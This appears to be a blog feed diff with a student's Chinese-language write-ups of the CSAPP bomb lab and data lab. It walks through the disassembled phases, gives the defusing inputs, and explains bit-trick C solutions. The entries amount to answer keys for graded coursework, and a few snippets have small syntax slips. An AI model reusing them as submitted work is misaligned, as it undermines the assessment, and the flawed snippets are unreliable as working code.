+<td>8</td>
+<td>0</td>
+</tr>
+<tr>
+<td>1</td>
+<td>2</td>
+<td></td>
+<td>9</td>
+<td>4</td>
+</tr>
+<tr>
+<td>2</td>
+<td>e</td>
+<td></td>
+<td>a</td>
+<td>1</td>
+</tr>
+<tr>
+<td>3</td>
+<td>7</td>
+<td></td>
+<td>b</td>
+<td>d</td>
+</tr>
+<tr>
+<td>4</td>
+<td>8</td>
+<td></td>
+<td>c</td>
+<td>3</td>
+</tr>
+<tr>
+<td>5</td>
+<td>c</td>
+<td></td>
+<td>d</td>
+<td>9</td>
+</tr>
+<tr>
+<td>6</td>
+<td>f</td>
+<td></td>
+<td>e</td>
+<td>6</td>
+</tr>
+<tr>
+<td>7</td>
+<td>b</td>
+<td></td>
+<td>f</td>
+<td>5</td>
+</tr>
+</tbody>
+</table>
+<p>第一个数只取最低四位做入口，x/不能等于0xf<br>
+第一个数edx加完后 = 0xf，执行15次<br>
+第二个数等于rcx</p>
+<p>读出该程序干的事情是加15次数组元素，其中最后一次一定加的是f，我们需要输入的是第一个下标以及加和。<br>
+不妨倒推，f+6+e+2+1 +a+0+8+4+9 +d+b+7+3+c = 115<br>
+那么我们第一个下标对应值c，即入口是5，加和是115。</p>
+<h2 id="phase_4-二分查找">phase_4: 二分查找</h2>
+<p>读入整数：<br>
+rcx(arg4) = rsp + 4 = &amp;num2<br>
+rdx(arg3) = rsp = &amp;num1<br>
+esi(arg2) = &quot;%d %d&quot;</p>
+<p>需要我们输入两个整数，盲猜可以进secret phase。<br>
+要求0 &lt;= num1 &lt;= 0xe，<br>
+rdx = 0xe(arg3) 上界<br>
+esi = 0(arg2) 下界<br>
+edi = num1(arg1)<br>
+call func4, <strong>要求返回值等于0xf</strong><br>
+要求num2=0xf，此时phase_4全部结束</p>
+<p><strong>func4</strong><br>
+传入了三个参数: num1(edi), 0(下界, esi)，0xe(上界, rdx)<br>
+eax = 0xe - 0 = 0xe<br>
+ebx = 0xe 逻辑右移 0x1f=31位，变0了吧，目测是看符号位<br>
+eax = 0xe + 0 = 0xe，算术右移变0x111=7，也就是做了作差除以2下取整<br>
+ebx = 0x(7 + 0)=0x7，中点值<br>
+跳+33<br>
+eax=0x7<br>
+ebx&gt;=num1时直接返回<br>
+...<br>
+是二分查找，差值是符号判断，如果上面的差值为负值，则ebx得1，挪一挪eax，防止死循环的，所以不去考虑它也完全没关系</p>
+<p>可以暴力从0x0到0xe直接试一遍，虽然容易手误<br>
+如果要仔细推理：在num为0到14，low初始为0，high初始为14的情况下怎样返回15呢？<br>
+尤其是，为什么num == 5时会返回15？因为我们每次都加了每次计算出的中间值，<br>
+所以：<br>
+左右端点为0和14时返回值+7，<br>
+左右端点为0和6时返回值+3；<br>
+左右端点为4和6时返回值+5。<br>
+返回值初始为0，完成上述查找得到返回15。</p>
+<h2 id="phase_3-跳转表">phase_3: 跳转表</h2>
+<p>注意输入是 <code>%d %c %d</code><br>
+分别传到 %rsp+10, %rsp+f, %rsp+14，换回了数字 数字 字符的顺序<br>
+num1 unsigned &gt; 7时，炸<br>
+也就是说0 &lt;= num1 ≤ 6，<br>
+根据num1的值跳到跳转表相应位置，从而执行相应switch的结构。<br>
+既然switch的default执行+319，我们先不看跳转表，直接看+319。<br>
+传入的%c等于%rax的最低位字符即可。<br>
+接下来看跳转表。<br>
+我们用 <code>x/a 0x402740</code>发现为+77，意味着%rax=num1=0时，执行+77，此时：<br>
+%eax=0x75，num2 = 0x51=81。所以c = 0x75=<code>u</code>即可，这个字符可通过 <code>Alt + 小键盘117</code> 得到。<br>
+答案为 <code>0 u 81</code></p>
+<h2 id="phase_2-斐波那契数列">phase_2: 斐波那契数列</h2>
+<p>%rsi参数2的值是%rsp，给read_six_numbers<br>
+利用read_six_numbers将参数3-8读入%rsi, %rsi+4, ..., %rsi+14共六处，对应于%rsp, %rsp+4, ..., %rsp+14共六处<br>
+num1=0<br>
+num2=1<br>
+%rbx=&amp;num1<br>
+%rbp=&amp;num5</p>
+<p>%eax = num2 = 1<br>
+num2 += num1 = 1<br>
+num3 = %eax = 1<br>
+%rbx = &amp;num2</p>
+<p>%eax = num3 = 1<br>
+%eax += num2 = 1+1=2<br>
+num4 = %eax = 2</p>
+<p>0 1 1 2 3 5</p>
+<h2 id="phase_1-比较字符串">phase_1: 比较字符串</h2>
+<p>strings_not_equal的返回值(%eax)为0就跳出去，意味着要求All strings are created equal. 识得唔识得啊。</p>
+<p>从相应位置读入所需字符串即可。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CSAPP: datalab]]></title>
+        <id>https://meredith2328.github.io/post/csapp-datalab/</id>
+        <link href="https://meredith2328.github.io/post/csapp-datalab/">
+        </link>
+        <updated>2024-04-30T03:05:18.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>最近没写什么其他好玩的东西，拿课堂作业报告水一水blog。</p>
+</blockquote>
+<h2 id="运行结果">运行结果</h2>
+<h3 id="dlc">dlc</h3>
+<pre><code>make
+./dlc -e bits.c
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://meredith2328.github.io/post-images/1714446458477.png" alt="" loading="lazy"></figure>
+<h3 id="btest">btest</h3>
+<pre><code>./btest
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://meredith2328.github.io/post-images/1714446471662.png" alt="" loading="lazy"></figure>
+<h2 id="思路">思路</h2>
+<h3 id="bitxor">bitXor</h3>
+<ul>
+<li>解法一</li>
+</ul>
+<p>直接考虑所求的两种情况。</p>
+<p>利用对称差公式：x ^ y = (x&amp;~y) | (y&amp;~x)，</p>
+<p>我们需要取这两种情况，所以取两次反，</p>
+<p>并将其中一次取反运用于<em>狄·摩根律</em>完成从|到&amp;的转换，即得所求为</p>
+<p><code>~(~(x &amp; ~y) &amp; ~(y &amp; ~x))</code>。</p>
+<ul>
+<li>解法二</li>
+</ul>
+<p>考虑反面的另外两种情况。</p>
+<p>x和y均为1或0时，x^y返回0。单独取这两种情况即为 (x &amp; y) | (~x &amp; ~y)。</p>
+<p>取其反面即为~( (x &amp; y) | (~x &amp; ~y) )。</p>
+<p>再运用<em>狄·摩根律</em>：~(a|b)=(~a)&amp;(~b) 完成从|到&amp;的转换，即得所求为</p>
+<p><code>~(~(x &amp; y)) &amp; ~(~x &amp; ~y))</code>。</p>
+<h3 id="tmin">tmin</h3>
+<p>32位的Two's complement范围为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><annotation encoding="application/x-tex">-2^{31}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，</p>
+<p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>T</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub><mo>=</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo>=</mo><mo>(</mo><mn>1</mn><mo>&lt;</mo><mo>&lt;</mo><mn>31</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">T_{min}=-2^{31}=(1&lt;&lt;31)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，即为首位为1、其余全0。</p>
+<h3 id="istmax">isTmax</h3>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>T</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub><mo>=</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">T_{max}=2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，即为首位为0、其余全1，</p>
+<ol>
+<li>正常思路是比较其取反是否为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>T</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub></mrow><annotation encoding="application/x-tex">T_{min}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，即返回值为 <code>~Tmax == Tmin</code>。</li>
+</ol>
+<p>但本题中不允许使用左移，也不能直接构造<code>Tmin = 0x80000000</code>，</p>
+<p>所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>T</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub></mrow><annotation encoding="application/x-tex">T_{min}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>要通过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>T</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">T_{max}+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>得到，即<code>~x == x + 1</code>。</p>
+<p>根据课本习题，<code>a==b</code>可以表示为 <code>!(a^b)</code> （因为a是自身的加法逆元，a^a=0，取非!即得1），</p>
+<p>符合题目中返回值只有1和0的条件。所以返回值改写为<code>!(~x ^ (x + 1))</code>。</p>
+<ol start="2">
+<li>但根据数据验证，发现-1也满足上述条件<code>~x == x + 1</code>，所以将-1另外排除，即正常思路为<code>x != -1</code>。</li>
+</ol>
+<p>再根据符号限制得到条件为<code>!!(x + 1)</code>。</p>
+<p>（用两次!是因为最终使用位与验证1、2条件同时满足，所以两个条件的值应该为0或1。但<code>x+1</code>的值不一定为0或1，所以用!规格化可以使其他非-1的值全部返回0，符合我们的需求）</p>
+<p>综上得到返回值为 <code>!(~x ^ (x + 1)) &amp; !!(x + 1)</code>，共8 ops，</p>
+<p>为了再简化可以反用前述<em>狄摩根律</em>写为<code>!((~x ^ (x + 1)) | !((x + 1) ^ 0))</code>，共7 ops。</p>
+<h3 id="alloddbits">allOddBits</h3>
+<p>因为所给符号与位数关联的只有左右移，需要人为构造，</p>
+<p>考虑使用掩码(BitMask)，即<code>x &amp; BitMask</code>某一位为1当且仅当x和BitMask该位同时为1。</p>
+<p>由于允许使用的常数范围为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mi>x</mi><mn>00</mn></mrow><annotation encoding="application/x-tex">0x00</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord">0</span><span class="mord">0</span></span></span></span>到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mi>x</mi><mi>F</mi><mi>F</mi></mrow><annotation encoding="application/x-tex">0xFF</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span></span></span></span>​，首先考虑长为8 bits的奇数x位置为1，相应掩码为[1010 1010]即<code>int bitMask = 0xAA</code>。其满足的条件应为 <code>x &amp; bitMask == bitMask</code>，即<code>!((x &amp; bitMask) ^ 0xbitMask)</code>。</p>
+<p>如果对x的所有8 Byte均判断，结果需要大量符号，所以构造所需的32 bits掩码即可。即</p>
+<p><code>int bitMask = (0xAA &lt;&lt; 24) | (0xAA &lt;&lt; 16) | (0xAA &lt;&lt; 8) | 0xAA</code>。</p>
+<h3 id="negate">negate</h3>
+<p>根据课本对模数加法构成阿贝尔群的论述，Tmin的加法逆元为Tmin，而其他数x的加法逆元为-x。</p>
+<p>这两种结果都满足 <code>-x == ~x + 1</code> 。</p>
+<h3 id="isasciidigit">isAsciiDigit</h3>
+<p>题目需要人为构造，考虑使用掩码。</p>
+<p>考虑题设条件：[0011 0000] &lt;= x &lt;= [0011 1001]，可以用以下条件逐位判断：</p>
+<pre><code>if ((x &gt;&gt; 4) == 0x3) {
+	int 3rdBit = (x &gt;&gt; 3) &amp; 0x1; // the 3rd bit, counting from 0th
+	if (3rdBit == 0) return 1;
+	else {
+		// if 3rdBit == 1, then 2ndBit and 1stBit must be [00]
+		int 2ndAnd1stBit = (x &gt;&gt; 1) &amp; 0x3;
+		if (2rdAnd1stBit == 0) return 1;
+		else return 0;
+	}
+}
+else return 0;
+</code></pre>
+<p>接下来将上述条件简化并根据所给符号改写即可，改写举例如下：</p>
+<pre><code>int HigherByteCond = !((x &gt;&gt; 4) ^ 0x3);
+int the3rdBit = (x &gt;&gt; 3) &amp; 0x1;
+int the2ndAnd1stBit = (x &gt;&gt; 1) &amp; 0x3;
+return HigherByteCond &amp; ((!the3rdBit) | (the3rdBit &amp; (!the2ndAnd1stBit)));
+</code></pre>
+<p>共计12 ops。</p>
+<h3 id="conditional">conditional</h3>
+<p>首先考虑没有限制的情况，再根据限制改写符号。</p>
+<p>不考虑符号时如下：</p>
+<pre><code>if (x) return z;
+else return y;
+</code></pre>
+<p>因为z和y具有某种程度的对称性，返回z可以拆成z + 0，返回y可以拆成 0 + y，</p>
+<p>所以如果按照python的逻辑与，返回值可以写为<code>(cond &amp;&amp; z) | (!cond &amp;&amp; y)</code>或<code>(cond &amp;&amp; z) + (!cond &amp;&amp; y)</code>。（python中，逻辑与的两侧如果同时非0，则返回其右侧的值）</p>
+<p>但需要考虑多位的返回值时，<code>&amp;&amp;</code>不能简单地改写为位与，所以另寻他法，即掩码运算。</p>
+<p>因为x只有非0和0，所以一定需要首先使用<code>int cond = !x;</code>来规格化，从而只考虑条件值为1和0的情况。</p>
+<p>如果z和y均只有一位，则返回值可以写为 <code>cond &amp; z + (!cond) &amp; y</code>，注意到cond实际扮演了掩码的角色。这为我们提供了灵感：可以根据cond构造所需长度的掩码（0xFFFFFFFF和0x00000000），规避显式的条件判断。即所需返回值为 <code>bitMask &amp; z + ~bitMask &amp; y</code>，只需构造<code>bitMask</code>即可。</p>
+<p>最后注意到取负可以分别将cond为1和0时映射到0xFFFFFFFF即-1与0x00000000即0，完成<code>bitMask</code>的构造。</p>
+<p>综上，本题思路如下：</p>
+<pre><code>int cond = !x;
+int bitMask = ~cond + 1;
+return ((~bitMask) &amp; y) + (bitMask &amp; z);
+</code></pre>
+<h3 id="islessorequal">isLessOrEqual</h3>
+<p>用差实现比较，差通过取负实现。</p>
+<p>根据课本，作和差时需要考虑溢出问题。正溢出得负数，负溢出得正数，判断即可。</p>
+<p>同号则一定不溢出、返回<code>diffSign</code>；前0后1时返回0、前1后0时返回1，即返回<code>xSign</code>。</p>
+<p>注意<code>diffSign</code>最好使用<code>-x + y</code>得到，它的符号位在<code>x &lt;= y</code>时一定为0，反之一定为1；</p>
+<p>而如果使用<code>x + (-y)</code>就不会有这样良好的效果（当<code>x == y</code>时）。</p>
+<pre><code>int xSign = (x &gt;&gt; 31) &amp; 0x1;
+int ySign = (y &gt;&gt; 31) &amp; 0x1;
+int signXor = xSign ^ ySign;
+int negaX = ~x + 1; 
+int diffSign = ((negaX + y) &gt;&gt; 31) &amp; 0x1;
+return ((!signXor) &amp; (!diffSign)) | (signXor &amp; xSign);
+</code></pre>
+<h3 id="logicalneg">logicalNeg</h3>
+<p>能够区分0和非0的性质非常有限，比如<code>x == -x</code>。但如果异或两个完整值，则仍然没有规避规格化问题。</p>
+<ul>
+<li>解法一</li>
+</ul>
+<p>考虑判断<code>x</code>与<code>-x</code>的符号位，并只对这一位做异或得到<code>signXor</code>，</p>
+<p>再将得到的0映射到1，得到的1映射到0即可，可以返回<code>1 - signXor = 2 + ~(signXor)</code>。</p>
+<p>除此之外，之前提到了<code>Tmin</code>的加法逆元也是其本身，需要排除掉。</p>
+<pre><code>int signXor = ((x ^ (~x + 1)) &gt;&gt; 31) &amp; 0x1;
+return ~(x &gt;&gt; 31) &amp; (2 + ~(signXor));
+</code></pre>
+<p>将0映射到1、将1映射到0也可以通过“加法逆元”即与1异或实现，即返回<code>signXor ^ 0x1</code>。</p>
+<pre><code>int signXor = ((x ^ (~x + 1)) &gt;&gt; 31) &amp; 0x1;
+return ~(x &gt;&gt; 31) &amp; (signXor ^ 0x1);
+</code></pre>
+<p>共计9 ops。</p>
+<ul>
+<li>解法二</li>
+</ul>
+<p>相比于异或，先“并”再移位之后取反得到的符号判断可以将<code>Tmin</code>也包含在非0的情况中，省去返回值的特判。</p>
+<figure data-type="image" tabindex="3"><img src="https://meredith2328.github.io/post-images/1714446532858.png" alt="" loading="lazy"></figure>
+<pre><code>int sameSign = ((x | (~x + 1)) &gt;&gt; 31) &amp; 0x1;
+return sameSign ^ 0x1;
+</code></pre>
+<p>甚至只有6 ops。</p>
+<h3 id="howmanybits">howManyBits</h3>
+<p>好难，需要多次细分。</p>
+<p>首先要注意这道题<strong>并没有限制字长为32</strong>，所以可以只用符号位的1 bit表示-1。</p>
+<p>正因如此，获得了重要的对称性：某个负值表示需要的比特数恰好等同于其取反需要的比特数，</p>
+<p>所以利用掩码将负值取反得到正值，正值或0不变：</p>
+<p>掩码取<code>x &gt;&gt; 31</code>，类似于前述<em>conditional</em>，置<code>y=x, z=~x</code>。</p>
+<p>之后利用二分思想，将判断区间划分为16、8、4、2、1。</p>
+<p>这基于以下事实：如果高16位不全为0（<code>!!(x &gt;&gt; 16) == 1</code>），则低16位需要被表示出来，即答案加16。</p>
+<p>同理，如果 <code>!!(x &gt;&gt; power) == 1</code>，则答案加<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo>=</mo><msup><mn>2</mn><mi>m</mi></msup><mo>=</mo><mo>(</mo><mn>1</mn><mo>&lt;</mo><mo>&lt;</mo><mi>m</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">power=2^m=(1 &lt;&lt; m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span>，</p>
+<p>即加 <code>bPower = !!(x &gt;&gt; power) &lt;&lt; m</code>。</p>
+<p>其中写作<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">power</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span>而非<code>1 &lt;&lt; m</code>是为了节省符号数。分别取<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo>=</mo><mn>16</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">power=16,8,4,2,1,0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span></span></span></span>判断、再将x右移<code>bPower</code>位即可。</p>
+<h3 id="floatscale2">floatScale2</h3>
+<p>终于解锁了条件判断和大常数。首先将浮点数拆分得到s, exp, frac分别占1, 8, 23位。</p>
+<p>特判NaN情况，除此之外：</p>
+<p>如果为非规格化（<code>exp == 0</code>），则直接给frac左移一位（注意使用位或的原因：当frac最高位为1时，这样的左移恰好为exp提供1，使其转化为较连续的非规格化值）；</p>
+<p>如果为规格化 （<code>exp != 0 &amp;&amp; exp != 0xFF</code>），则给exp加一。</p>
+<h3 id="floatfloat2int">floatFloat2Int</h3>
+<p>特判：<code>exp == 0xFF</code> 时返回 0x80000000u即<code>1&lt;&lt;31</code>。</p>
+<p>其他情况不妨首先考虑非负数情况，如果为负数则在最后取负。</p>
